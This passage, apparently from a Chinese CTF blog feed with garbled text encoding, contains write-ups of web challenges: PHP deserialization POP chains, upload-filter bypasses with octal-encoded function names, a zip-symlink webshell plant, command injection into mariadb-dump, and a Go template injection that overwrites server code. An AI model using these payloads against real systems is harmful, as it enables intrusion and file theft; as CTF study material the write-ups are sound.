<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘invoke\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘destruct\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;getflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘toString\n&quot;</span>;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘uwant\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c2</span> =<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$c2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// echo $result;</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#x27;</span>, <span class="string">&#x27;O:1:&quot;A&quot;:3:&#x27;</span>,<span class="variable">$result</span>);<span class="comment">//ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128163059684-1686150400486.png" alt="image-20221128163059684"></p><p>è¿™é‡Œçš„500æ˜¯å› ä¸ºC::tostring()çš„æŠ¥é”™ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–å‡ºé”™ã€‚</p><img src="E:\typora img\image-20221128163329919.png" alt="image-20221128163329919" style="zoom:67%;" /><p>ç¬¬ä¸‰æ­¥ï¼Œä¿®æ”¹cookieä¸­çš„PHPSESSIONIDä¸ºSSRFè¯·æ±‚çš„PHPSESSIONIDï¼Œè¯»å–åˆ°flagã€‚</p><p><img src="/../images/image-20221128163549644-1686150400486.png" alt="image-20221128163549644"></p><p>æŸ¥çœ‹flagæ–‡ä»¶åçš„ç»“æœ</p><p><img src="/../images/image-20221128163822875-1686150400486.png" alt="image-20221128163822875"></p><h2 id="easy-uploadâ€“å¤ç°"><a href="#easy-uploadâ€“å¤ç°" class="headerlink" title="easy_uploadâ€“å¤ç°"></a>easy_uploadâ€“å¤ç°</h2><p>dirsearchæ‰«ææ²¡æœ‰å‘ç°å…¶ä»–é¡µé¢ã€‚</p><p>åªæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</p><ul><li>å…ˆä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°æœ‰è¿‡æ»¤</li></ul><p><img src="/../images/image-20221128164147870-1686150400486.png" alt="image-20221128164147870"></p><ul><li>å°è¯•å›¾ç‰‡+.htaceess</li></ul><p><img src="/../images/image-20221128164425319-1686150400486.png" alt="image-20221128164425319"></p><p>å‘ç°åªæ¥å—.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ˜¯è¦ç»•è¿‡æ–‡ä»¶å†…å®¹è¿‡æ»¤ã€‚</p><p>ç»æµ‹è¯•å‘ç°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ` * è¿˜æœ‰å¾ˆå¤šå‡½æ•°è¢«è¿‡æ»¤</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹å¯ä»¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164736609-1686150400486.png" alt="image-20221128164736609"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164852425-1686150400487.png" alt="image-20221128164852425"></p><p>åœ¨phpinfoä¸­å¯ä»¥å‘ç°<code>disable_function</code>ç¦ç”¨äº†å‡ ä¹æ‰€æœ‰çš„å‡½æ•°ã€‚</p><img src="E:\typora img\image-20221128164951239.png" alt="image-20221128164951239" style="zoom:67%;" /><p>ä½†æ˜¯æ²¡æœ‰ç¦ç”¨<code>file_get_contents</code>è¿™ä¸ªè¯»å–æ–‡ä»¶çš„å‡½æ•°ã€‚æ‰€ä»¥åªè¦èƒ½æ‰¾åˆ°flagçš„è·¯å¾„å°±å¯ä»¥äº†ã€‚</p><p>ç½‘ä¸Šçš„å¸ˆå‚…åšæ³•æ˜¯åˆ©ç”¨åŸç”Ÿç±»æ¥æ‰¾åˆ°è·¯å¾„ï¼Œåˆ©ç”¨phpå­—ç¬¦ä¸²è§£ææ¥ç»•è¿‡å­—ç¬¦è¿‡æ»¤ã€‚</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>æŸ¥æ‰¾è·¯å¾„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \147\154\157\142\72\57\57\57\146\52 â†’ glob:///f*</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\147\154\157\142\72\57\57\57\146\52&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165717142-1686150400487.png" alt="image-20221128165717142"></p><p>è¯»å–flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163 â†’ file_get_contents</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163&quot;</span>(<span class="string">&quot;/fl1111111111ag&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165926537-1686150400487.png" alt="image-20221128165926537"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="flybenbenâ€“å¤ç°"><a href="#flybenbenâ€“å¤ç°" class="headerlink" title="flybenbenâ€“å¤ç°"></a>flybenbenâ€“å¤ç°</h2><p>CEä¿®æ”¹</p><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20221128160736-1686150400487.jpg" alt="QQæˆªå›¾20221128160736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 åˆèµ›</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27æ—¥-unzip"><a href="#27æ—¥-unzip" class="headerlink" title="27æ—¥_unzip"></a><strong>27æ—¥_unzip</strong></h2><p>æ‰“å¼€ç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œé…åˆé¢˜ç›®çš„åå­—ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶ï¼Œç„¶åå›æ˜¾</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>å‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>unzip</code>å‘½ä»¤æ¥è§£å‹ç¼©ä¸Šä¼ çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è·¯å¾„ç©¿è¶Š</p><blockquote><p>å› ä¸º<code>unzip</code>é»˜è®¤ä¼šå¿½è§†æ–‡ä»¶åä¸­<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡è½¯é“¾æ¥è¾¾åˆ°è·¯å¾„ç©¿è¶Šçš„åŠŸèƒ½ã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•ï¼Œå‹ç¼©ä¸º1.zip</p><blockquote><p>zipè¦åŠ ä¸Š-yå‚æ•°ï¼Œæ‰èƒ½ä¿å­˜è½¯é“¾æ¥</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œå°†è¯¥ç›®å½•å‹ç¼©ä¸º2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>æœ€åè®¿é—®ï¼Œæ‰§è¡Œ<code>cat /flag</code>å³å¯</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>è®¿é—®ç½‘ç«™çœ‹åˆ°</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>å¯ä»¥dumpå’Œquery</p><p>ä¸€å¼€å§‹æ˜¯å¯¹ç€queryæ€¼çš„ï¼Œå› ä¸ºå¯¹dumpä¸ç†Ÿ</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>æŠŠè¯­å¥æ‰“å°å‡ºæ¥äº†ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥æ§åˆ¶table_2_queryè¿›è¡Œæ³¨å…¥ï¼Œç„¶åé¢˜ç›®æç¤ºäº†flagåœ¨&#x2F;flagï¼Œæ‰€ä»¥å…ˆå°è¯•å¯ä¸å¯ä»¥å†™æ–‡ä»¶getshellï¼Œå‘ç°ä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹secure_file_privä¸ºNULLç¡®å®æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>å°è¯•å †å æ³¨å…¥ï¼Œçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½æ—¥å¿—getshellï¼Œå‘ç°ï¼›åå¼•å·éƒ½è¢«è¿‡æ»¤äº†</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>æ‰€ä»¥queryè¿™æ¡è·¯å°±èµ°ä¸é€šäº†ã€‚</p><p>ç„¶åæ˜¯dumpï¼Œåœ¨ç½‘ä¸ŠæŸ¥åˆ°</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>çŸ¥é“äº†æ˜¯ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æ¥dumpï¼Œè¿™é‡Œå°±å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>å‚ç…§ç¬”è®°ï¼Œè¿™é‡Œåªç”¨0d%0aå¯ä»¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>åœ¨hereä¸­å¯ä»¥çœ‹åˆ°æºç </p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>å…³é”®ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ä¸æ˜¯è¯´äº†flagåœ¨&#x2F;flagï¼Œè¯»äº†ä¸€ä¸‹å‘ç°æ²¡ç”¨ï¼Œçœ‹äº†ä¸€ä¸‹æƒé™</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>å¼€å§‹æƒ³ç€å†™ä¸ªğŸï¼Œä¸Šå»ææƒè¯•è¯•ï¼Œçœ‹äº†ä¸‹ç›®å½•æƒé™ï¼Œåå¼¹shellä¹Ÿå¤±è´¥äº†ï¼ˆéº»äº†ğŸ˜…ï¼‰</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>åé¢æƒ³åˆ°å¯èƒ½è¢«éª—äº†ï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°äº†flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-sessionâ€“å¤ç°"><a href="#go-sessionâ€“å¤ç°" class="headerlink" title="go_sessionâ€“å¤ç°"></a>go_sessionâ€“å¤ç°</h2><p>æœ¬åœ°ä¼ªé€ session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¼ªé€ æˆåŠŸäº†</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFileä¸Šä¼ è¡¨å•æ–‡ä»¶åˆ°æŒ‡å®šçš„dst</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¡¨å•nameï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦ä¿å­˜çš„ä½ç½®</p><p>è¯»å–æºç </p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>E:/test.txt</span><br><span class="line"></span><br><span class="line">/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>å‘ç°å®ƒæ˜¯debugæ¨¡å¼çš„ï¼Œ<strong>çƒ­éƒ¨ç½²ï¼ˆå°±æ˜¯æ¯æ¬¡ä¿®æ”¹ä¹‹åä¼šé‡æ–°ç¼–è¯‘è¿è¡Œä¸€æ¬¡ï¼‰</strong></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œè¦†ç›–</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>è¦†ç›–å®Œåï¼Œè®¿é—®<code>/flask?name=</code>ï¼ŒæˆåŠŸè¯»å–åˆ°äº†&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>ä¸€çœ¼pythonæ²™ç›’é€ƒé€¸</p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>ç»•ä¸€ä¸‹<code>__import__</code>å’Œ<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>å¯ä»¥ç”¨+æ‹¼æ¥ç»•è¿‡ï¼Œæœ€åç”¨_ç‰¹æ€§å’Œevalå‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²å³å¯</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>æœ€åçš„payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFåˆ·é¢˜åˆé›†</title>
      <link href="/2023/05/31/BUU/"/>
      <url>/2023/05/31/BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-10æœˆèµ›"><a href="#2022-10æœˆèµ›" class="headerlink" title="2022.10æœˆèµ›"></a>2022.10æœˆèµ›</h1><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>popé“¾</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sorry::_destruct() ---&gt;  show::_tostring()  ---&gt;  secret_code::call ---&gt;  secret_code::show() ---&gt;  sorry::_get() </span><br><span class="line">---&gt;  fine::__invoke()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘invoke&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cmd:<span class="subst">$this</span>-&gt;cmd,content:<span class="subst">$this</span>-&gt;content&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ 